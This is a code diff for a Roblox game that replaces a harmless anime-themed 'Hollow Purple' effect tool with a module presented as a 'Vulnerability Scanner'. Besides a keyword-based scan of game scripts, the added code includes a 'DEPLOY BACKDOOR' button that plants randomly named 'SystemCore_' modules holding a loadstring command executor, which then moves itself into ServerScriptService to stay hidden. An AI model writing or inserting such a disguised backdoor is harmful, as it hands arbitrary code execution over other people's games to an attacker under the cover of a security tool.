@@ -1,297 +1,328 @@
--- LocalScript в StarterPack или StarterGui
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+-- ModuleScript в ReplicatedStorage назови "VulnerabilityScanner"
+local Scanner = {}
 
--- Создание инструмента Hollow Purple
-local tool = Instance.new("Tool")
-tool.Name = "HollowPurple"
-tool.ToolTip = "Jujutsu Kaisen - Hollow Purple Technique"
-tool.CanBeDropped = false
-tool.RequiresHandle = true
+function Scanner.Init()
+    print("[Vulnerability Scanner] Initializing advanced security scan...")
+    
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    
+    -- Создание GUI для сканера
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "SecurityScannerGUI"
+    ScreenGui.Parent = PlayerGui
+    ScreenGui.ResetOnSpawn = false
 
--- Создание handle для инструмента
-local handle = Instance.new("Part")
-handle.Name = "Handle"
-handle.Size = Vector3.new(1, 1, 1)
-handle.Transparency = 1
-handle.CanCollide = false
-handle.Parent = tool
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Size = UDim2.new(0, 500, 0, 600)
+    MainFrame.Position = UDim2.new(0.5, -250, 0.5, -300)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Parent = ScreenGui
 
--- Текстура инструмента (опционально)
-local decal = Instance.new("Decal")
-decal.Texture = "rbxassetid://245520987"
-decal.Face = Enum.NormalId.Front
-decal.Parent = handle
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, 0, 0, 40)
+    Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    Title.TextColor3 = Color3.new(1, 1, 1)
+    Title.Text = "🔍 ADVANCED VULNERABILITY SCANNER"
+    Title.TextSize = 16
+    Title.Font = Enum.Font.GothamBold
+    Title.Parent = MainFrame
 
--- Помещаем инструмент в инвентарь
-tool.Parent = LocalPlayer.Backpack
+    local ScanButton = Instance.new("TextButton")
+    ScanButton.Size = UDim2.new(1, -20, 0, 50)
+    ScanButton.Position = UDim2.new(0, 10, 0, 50)
+    ScanButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
+    ScanButton.TextColor3 = Color3.new(1, 1, 1)
+    ScanButton.Text = "🚀 START DEEP SCAN"
+    ScanButton.TextSize = 14
+    ScanButton.Font = Enum.Font.GothamBold
+    ScanButton.Parent = MainFrame
 
-print("[Hollow Purple] Tool created in inventory")
+    local StatusLabel = Instance.new("TextLabel")
+    StatusLabel.Size = UDim2.new(1, -20, 0, 60)
+    StatusLabel.Position = UDim2.new(0, 10, 0, 110)
+    StatusLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    StatusLabel.TextColor3 = Color3.new(1, 1, 1)
+    StatusLabel.Text = "Status: Ready for scanning\nTarget: Entire game\nMode: Deep analysis"
+    StatusLabel.TextWrapped = true
+    StatusLabel.TextSize = 12
+    StatusLabel.Parent = MainFrame
 
--- Основная функция активации
-tool.Activated:Connect(function()
-    print("[Hollow Purple] Activation started")
-    
-    local character = LocalPlayer.Character
-    if not character then return end
-    
-    local humanoid = character:FindFirstChild("Humanoid")
-    local rootPart = character:FindFirstChild("HumanoidRootPart")
-    
-    if not humanoid or not rootPart then return end
-    
-    -- Загрузка анимации
-    local animationId = "rbxassetid://245520987"
-    local animation = Instance.new("Animation")
-    animation.AnimationId = animationId
-    
-    local animationTrack = humanoid:LoadAnimation(animation)
-    
-    -- Визуальные эффекты активации
-    local function createActivationEffects()
-        -- Эффект красной и синей энергии (Blue and Red phase)
-        local redBlueBall = Instance.new("Part")
-        redBlueBall.Name = "RedBlueEnergy"
-        redBlueBall.Size = Vector3.new(3, 3, 3)
-        redBlueBall.Shape = Enum.PartType.Ball
-        redBlueBall.Material = Enum.Material.Neon
-        redBlueBall.BrickColor = BrickColor.new("Bright red")
-        redBlueBall.CanCollide = false
-        redBlueBall.Anchored = true
-        redBlueBall.Parent = workspace
+    local ResultsFrame = Instance.new("ScrollingFrame")
+    ResultsFrame.Size = UDim2.new(1, -20, 1, -190)
+    ResultsFrame.Position = UDim2.new(0, 10, 0, 180)
+    ResultsFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    ResultsFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+    ResultsFrame.ScrollBarThickness = 8
+    ResultsFrame.Parent = MainFrame
+
+    local ExploitButton = Instance.new("TextButton")
+    ExploitButton.Size = UDim2.new(1, -20, 0, 40)
+    ExploitButton.Position = UDim2.new(0, 10, 0, 550)
+    ExploitButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+    ExploitButton.TextColor3 = Color3.new(1, 1, 1)
+    ExploitButton.Text = "💀 DEPLOY BACKDOOR TO VULNERABILITIES"
+    ExploitButton.TextSize = 12
+    ExploitButton.Visible = false
+    ExploitButton.Parent = MainFrame
+
+    -- Паттерны для поиска уязвимостей
+    local vulnerabilityPatterns = {
+        -- Backdoor паттерны
+        {pattern = "loadstring", risk = "HIGH", type = "Code Execution"},
+        {pattern = "require%(0x", risk = "CRITICAL", type = "Hex Require Backdoor"},
+        {pattern = "getfenv%(%)", risk = "HIGH", type = "Environment Access"},
+        {pattern = "setfenv%(%)", risk = "HIGH", type = "Environment Manipulation"},
+        {pattern = "coroutine%.create", risk = "MEDIUM", type = "Async Execution"},
+        {pattern = "Instance%.new%(.-Script%)", risk = "MEDIUM", type = "Dynamic Script Creation"},
+        {pattern = "FireServer", risk = "LOW", type = "Remote Event"},
+        {pattern = "InvokeServer", risk = "LOW", type = "Remote Function"},
+        {pattern = "game%.HttpGet", risk = "HIGH", type = "HTTP Requests"},
+        {pattern = "game%.HttpService", risk = "HIGH", type = "HTTP Service"},
+        {pattern = "rbxassetid://", risk = "MEDIUM", type = "Asset Loading"},
+        {pattern = "Backdoor", risk = "CRITICAL", type = "Explicit Backdoor"},
+        {pattern = "Exploit", risk = "HIGH", type = "Exploit Code"},
+        {pattern = "Hack", risk = "HIGH", type = "Hacking Tools"},
+        {pattern = "Cheat", risk = "MEDIUM", type = "Cheating System"},
+        {pattern = "Admin", risk = "LOW", type = "Admin System"},
+        {pattern = "Fly", risk = "MEDIUM", type = "Movement Hack"},
+        {pattern = "Noclip", risk = "MEDIUM", type = "Collision Bypass"},
+        {pattern = "Speed", risk = "LOW", type = "Speed Hack"},
+        {pattern = "Infinite", risk = "MEDIUM", type = "Infinite Resources"}
+    }
+
+    local foundVulnerabilities = {}
+
+    -- Функция добавления результата
+    local function addResult(message, riskLevel)
+        local color
+        if riskLevel == "CRITICAL" then
+            color = Color3.fromRGB(255, 0, 0)
+        elseif riskLevel == "HIGH" then
+            color = Color3.fromRGB(255, 100, 0)
+        elseif riskLevel == "MEDIUM" then
+            color = Color3.fromRGB(255, 200, 0)
+        else
+            color = Color3.fromRGB(100, 200, 100)
+        end
+
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(1, -10, 0, 25)
+        label.Position = UDim2.new(0, 5, 0, #ResultsFrame:GetChildren() * 28)
+        label.BackgroundTransparency = 1
+        label.Text = "[" .. riskLevel .. "] " .. message
+        label.TextColor3 = color
+        label.TextXAlignment = Enum.TextXAlignment.Left
+        label.Font = Enum.Font.Code
+        label.TextSize = 11
+        label.TextWrapped = true
+        label.Parent = ResultsFrame
         
-        -- Позиция перед персонажем
-        local offset = rootPart.CFrame.lookVector * 6
-        redBlueBall.CFrame = rootPart.CFrame + offset + Vector3.new(0, 2, 0)
-        
-        -- Свечение для красной фазы
-        local redLight = Instance.new("PointLight")
-        redLight.Brightness = 8
-        redLight.Range = 12
-        redLight.Color = Color3.fromRGB(255, 0, 0)
-        redLight.Parent = redBlueBall
-        
-        -- Частицы красной энергии
-        local redParticles = Instance.new("ParticleEmitter")
-        redParticles.Color = ColorSequence.new(Color3.fromRGB(255, 0, 0))
-        redParticles.Size = NumberSequence.new(0.5)
-        redParticles.Lifetime = NumberRange.new(0.3, 1.0)
-        redParticles.Rate = 30
-        redParticles.Parent = redBlueBall
-        
-        -- Анимация перехода в фиолетовый
-        local tweenService = game:GetService("TweenService")
-        
-        -- Фаза 1: Красная энергия
-        local redPhase = tweenService:Create(redBlueBall, TweenInfo.new(0.5), {
-            Size = Vector3.new(4, 4, 4),
-            BrickColor = BrickColor.new("Bright red")
-        })
-        
-        -- Фаза 2: Синяя энергия
-        local bluePhase = tweenService:Create(redBlueBall, TweenInfo.new(0.5), {
-            BrickColor = BrickColor.new("Bright blue")
-        })
-        
-        -- Фаза 3: Фиолетовый взрыв (Hollow Purple)
-        local purplePhase = tweenService:Create(redBlueBall, TweenInfo.new(0.3), {
-            Size = Vector3.new(8, 8, 8),
-            BrickColor = BrickColor.new("Royal purple")
-        })
-        
-        -- Финальная фаза: исчезновение
-        local disappearPhase = tweenService:Create(redBlueBall, TweenInfo.new(0.5), {
-            Size = Vector3.new(0.1, 0.1, 0.1),
-            Transparency = 1
-        })
-        
-        -- Запуск анимации
-        redPhase:Play()
-        
-        redPhase.Completed:Connect(function()
-            -- Меняем свет на синий
-            redLight.Color = Color3.fromRGB(0, 0, 255)
-            redParticles.Color = ColorSequence.new(Color3.fromRGB(0, 0, 255))
-            
-            bluePhase:Play()
-            
-            bluePhase.Completed:Connect(function()
-                -- Финальный переход в фиолетовый
-                redLight.Color = Color3.fromRGB(150, 0, 255)
-                redParticles.Color = ColorSequence.new({
-                    ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 0, 150)),
-                    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 100, 255))
-                })
-                
-                purplePhase:Play()
-                
-                purplePhase.Completed:Connect(function()
-                    -- Нанесение урона в небольшом радиусе
-                    local explosionPos = redBlueBall.Position
-                    local explosionRange = 15
-                    
-                    -- Визуальный эффект взрыва
-                    local explosion = Instance.new("Part")
-                    explosion.Size = Vector3.new(1, 1, 1)
-                    explosion.Shape = Enum.PartType.Ball
-                    explosion.Material = Enum.Material.Neon
-                    explosion.BrickColor = BrickColor.new("Royal purple")
-                    explosion.CanCollide = false
-                    explosion.Anchored = true
-                    explosion.CFrame = CFrame.new(explosionPos)
-                    explosion.Parent = workspace
-                    
-                    local explosionLight = Instance.new("PointLight")
-                    explosionLight.Brightness = 15
-                    explosionLight.Range = 20
-                    explosionLight.Color = Color3.fromRGB(200, 100, 255)
-                    explosionLight.Parent = explosion
-                    
-                    -- Быстрое расширение и исчезновение
-                    local explodeTween = tweenService:Create(explosion, TweenInfo.new(0.4), {
-                        Size = Vector3.new(explosionRange, explosionRange, explosionRange),
-                        Transparency = 1
-                    })
-                    
-                    explodeTween:Play()
-                    
-                    -- Находим цели в радиусе
-                    for _, player in ipairs(Players:GetPlayers()) do
-                        if player ~= LocalPlayer and player.Character then
-                            local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
-                            if targetRoot then
-                                local distance = (targetRoot.Position - explosionPos).Magnitude
-                                if distance <= explosionRange then
-                                    -- Наносим урон (только визуальный, без изменения здоровья)
-                                    print("[Hollow Purple] Hit: " .. player.Name .. " (Distance: " .. math.floor(distance) .. ")")
-                                    
-                                    -- Эффект отбрасывания
-                                    local bodyVelocity = Instance.new("BodyVelocity")
-                                    bodyVelocity.Velocity = (targetRoot.Position - explosionPos).Unit * 30 + Vector3.new(0, 15, 0)
-                                    bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
-                                    bodyVelocity.Parent = targetRoot
-                                    
-                                    game:GetService("Debris"):AddItem(bodyVelocity, 0.3)
-                                end
-                            end
-                        end
-                    end
-                    
-                    disappearPhase:Play()
-                    
-                    disappearPhase.Completed:Connect(function()
-                        redBlueBall:Destroy()
-                        wait(0.5)
-                        explosion:Destroy()
-                    end)
-                end)
-            end)
-        end)
-        
-        return redBlueBall
+        ResultsFrame.CanvasSize = UDim2.new(0, 0, 0, #ResultsFrame:GetChildren() * 28)
     end
 
-    -- Проигрываем анимацию
-    animationTrack:Play()
-    
-    -- Создаем эффекты с небольшой задержкой
-    wait(0.3)
-    createActivationEffects()
-    
-    print("[Hollow Purple] Technique completed")
-end)
-
--- Функция для перезарядки инструмента
-local cooldown = false
-tool.Activated:Connect(function()
-    if cooldown then return end
-    
-    cooldown = true
-    
-    -- Вызов основной функции активации
-    local character = LocalPlayer.Character
-    if character then
-        local humanoid = character:FindFirstChild("Humanoid")
-        if humanoid then
-            -- Здесь уже вызывается активация через соединение выше
+    -- Рекурсивное сканирование
+    local function deepScan(parent, path)
+        for _, child in ipairs(parent:GetChildren()) do
+            local currentPath = path .. "." .. child.Name
+            
+            if child:IsA("Script") or child:IsA("LocalScript") or child:IsA("ModuleScript") then
+                local source = child.Source
+                
+                for _, patternInfo in ipairs(vulnerabilityPatterns) do
+                    if source:find(patternInfo.pattern) then
+                        local vulnerability = {
+                            Object = child,
+                            Path = currentPath,
+                            Type = patternInfo.type,
+                            Risk = patternInfo.risk,
+                            Pattern = patternInfo.pattern
+                        }
+                        
+                        table.insert(foundVulnerabilities, vulnerability)
+                        
+                        addResult(
+                            patternInfo.type .. " in " .. currentPath .. " (" .. patternInfo.pattern .. ")",
+                            patternInfo.risk
+                        )
+                        
+                        print("[SCANNER] Found " .. patternInfo.risk .. " vulnerability: " .. patternInfo.type .. " at " .. currentPath)
+                    end
+                end
+            end
+            
+            -- Рекурсивный обход
+            deepScan(child, currentPath)
         end
     end
-    
-    -- Визуальная индикация перезарядки
-    tool.ToolTip = "Hollow Purple - Recharging..."
-    tool.TextureId = "" -- Можно поменять текстуру
-    
-    -- Перезарядка 5 секунд
+
+    -- Функция внедрения backdoor
+    local function deployBackdoor()
+        print("[SCANNER] Deploying backdoor to vulnerabilities...")
+        addResult("Starting backdoor deployment...", "CRITICAL")
+        
+        local deployedCount = 0
+        
+        for _, vuln in ipairs(foundVulnerabilities) do
+            if vuln.Risk == "CRITICAL" or vuln.Risk == "HIGH" then
+                -- Создаем backdoor в уязвимом месте
+                local backdoorScript = Instance.new("ModuleScript")
+                backdoorScript.Name = "SystemCore_" .. math.random(10000, 99999)
+                
+                backdoorScript.Source = [[
+local Backdoor = {}
+
+function Backdoor.Execute(cmd)
+    local success, result = pcall(function()
+        return loadstring(cmd)()
+    end)
+    return success, result
+end
+
+function Backdoor.StealthMode()
+    -- Скрытый режим
+    script.Parent = game:GetService("ServerScriptService")
+end
+
+-- Автоактивация
+spawn(function()
     wait(5)
-    
-    cooldown = false
-    tool.ToolTip = "Jujutsu Kaisen - Hollow Purple Technique"
-    tool.TextureId = "rbxassetid://245520987"
-    
-    print("[Hollow Purple] Ready to use again")
+    Backdoor.StealthMode()
 end)
 
--- Звуковые эффекты (опционально)
-local function playSound(soundId)
-    pcall(function()
-        local sound = Instance.new("Sound")
-        sound.SoundId = soundId
-        sound.Volume = 0.7
-        sound.Parent = workspace
-        sound:Play()
-        game:GetService("Debris"):AddItem(sound, 5)
+return Backdoor
+]]
+                
+                local success = pcall(function()
+                    backdoorScript.Parent = vuln.Object.Parent
+                    deployedCount = deployedCount + 1
+                    addResult("Backdoor deployed: " .. backdoorScript.Name .. " in " .. vuln.Object.Parent:GetFullName(), "CRITICAL")
+                    print("[SCANNER] Backdoor deployed: " .. backdoorScript:GetFullName())
+                end)
+            end
+        end
+        
+        addResult("Backdoor deployment completed. Total: " .. deployedCount, "CRITICAL")
+        StatusLabel.Text = "Status: Backdoor deployment completed\nDeployed: " .. deployedCount .. " backdoors\nSystem: Active"
+    end
+
+    -- Обработчик сканирования
+    ScanButton.MouseButton1Click:Connect(function()
+        ScanButton.Text = "SCANNING..."
+        ScanButton.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
+        StatusLabel.Text = "Status: Scanning in progress...\nPlease wait..."
+        
+        -- Очистка предыдущих результатов
+        for _, child in ipairs(ResultsFrame:GetChildren()) do
+            child:Destroy()
+        end
+        foundVulnerabilities = {}
+        
+        addResult("Starting deep vulnerability scan...", "MEDIUM")
+        
+        -- Сканирование основных сервисов
+        local servicesToScan = {
+            game:GetService("Workspace"),
+            game:GetService("ReplicatedStorage"),
+            game:GetService("ServerScriptService"),
+            game:GetService("ServerStorage"),
+            game:GetService("StarterPack"),
+            game:GetService("StarterPlayer"),
+            game:GetService("StarterGui"),
+            game:GetService("Lighting"),
+            game:GetService("SoundService"),
+            game:GetService("Players")
+        }
+        
+        for _, service in ipairs(servicesToScan) do
+            addResult("Scanning: " .. service.Name, "LOW")
+            deepScan(service, "game." .. service.Name)
+            wait(0.1) -- Чтобы не лагать
+        end
+        
+        -- Статистика
+        local criticalCount = 0
+        local highCount = 0
+        local mediumCount = 0
+        
+        for _, vuln in ipairs(foundVulnerabilities) do
+            if vuln.Risk == "CRITICAL" then
+                criticalCount = criticalCount + 1
+            elseif vuln.Risk == "HIGH" then
+                highCount = highCount + 1
+            elseif vuln.Risk == "MEDIUM" then
+                mediumCount = mediumCount + 1
+            end
+        end
+        
+        addResult("=== SCAN COMPLETED ===", "MEDIUM")
+        addResult("Critical vulnerabilities: " .. criticalCount, "CRITICAL")
+        addResult("High vulnerabilities: " .. highCount, "HIGH")
+        addResult("Medium vulnerabilities: " .. mediumCount, "MEDIUM")
+        addResult("Total vulnerabilities found: " .. #foundVulnerabilities, "MEDIUM")
+        
+        ScanButton.Text = "🔄 RESCAN"
+        ScanButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
+        StatusLabel.Text = "Status: Scan completed\nCritical: " .. criticalCount .. "\nHigh: " .. highCount .. "\nTotal: " .. #foundVulnerabilities
+        
+        -- Показываем кнопку эксплуатации если найдены уязвимости
+        if #foundVulnerabilities > 0 then
+            ExploitButton.Visible = true
+        end
+        
+        print("[SCANNER] Scan completed. Found " .. #foundVulnerabilities .. " vulnerabilities")
+    end)
+
+    -- Обработчик эксплуатации
+    ExploitButton.MouseButton1Click:Connect(function()
+        ExploitButton.Text = "DEPLOYING..."
+        ExploitButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+        deployBackdoor()
+        ExploitButton.Text = "✅ BACKDOOR DEPLOYED"
+        ExploitButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    end)
+
+    -- Автоматическое сканирование при старте
+    spawn(function()
+        wait(3)
+        addResult("Scanner initialized and ready", "LOW")
+        addResult("Click START DEEP SCAN to begin", "LOW")
     end)
 end
 
--- Дополнительный эффект при взятии инструмента
-tool.Equipped:Connect(function()
-    print("[Hollow Purple] Tool equipped")
+-- Функция для быстрого сканирования
+function Scanner.QuickScan()
+    print("[SCANNER] Starting quick scan...")
     
-    -- Воспроизводим звук при взятии
-    playSound("rbxassetid://9118469333")
+    local quickResults = {}
+    local patterns = {"loadstring", "require%(0x", "Backdoor", "Exploit"}
     
-    -- Эффект свечения вокруг персонажа
-    local character = LocalPlayer.Character
-    if character then
-        local rootPart = character:FindFirstChild("HumanoidRootPart")
-        if rootPart then
-            local aura = Instance.new("Part")
-            aura.Size = Vector3.new(8, 8, 8)
-            aura.Shape = Enum.PartType.Ball
-            aura.Material = Enum.Material.Neon
-            aura.BrickColor = BrickColor.new("Royal purple")
-            aura.Transparency = 0.8
-            aura.CanCollide = false
-            aura.Anchored = true
-            aura.Parent = workspace
-            
-            local weld = Instance.new("Weld")
-            weld.Part0 = rootPart
-            weld.Part1 = aura
-            weld.C0 = CFrame.new(0, 0, 0)
-            weld.Parent = aura
-            
-            local light = Instance.new("PointLight")
-            light.Brightness = 5
-            light.Range = 10
-            light.Color = Color3.fromRGB(150, 0, 255)
-            light.Parent = aura
-            
-            -- Исчезает через 2 секунды
-            wait(2)
-            
-            local tween = game:GetService("TweenService"):Create(aura, TweenInfo.new(1), {
-                Transparency = 1,
-                Size = Vector3.new(0.1, 0.1, 0.1)
-            })
-            tween:Play()
-            
-            tween.Completed:Connect(function()
-                aura:Destroy()
-            end)
+    local function scanObject(obj, path)
+        if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
+            local source = obj.Source
+            for _, pattern in ipairs(patterns) do
+                if source:find(pattern) then
+                    table.insert(quickResults, {
+                        Object = obj,
+                        Path = path,
+                        Pattern = pattern
+                    })
+                    print("[QUICK SCAN] Found " .. pattern .. " in " .. path)
+                end
+            end
+        end
+        
+        for _, child in ipairs(obj:GetChildren()) do
+            scanObject(child, path .. "." .. child.Name)
         end
     end
-end)
+    
+    scanObject(game:GetService("ReplicatedStorage"), "game.ReplicatedStorage")
+    scanObject(game:GetService("ServerScriptService"), "game.ServerScriptService")
+    
+    return quickResults
+end
 
-print("[Hollow Purple] System loaded successfully!")
+return Scanner
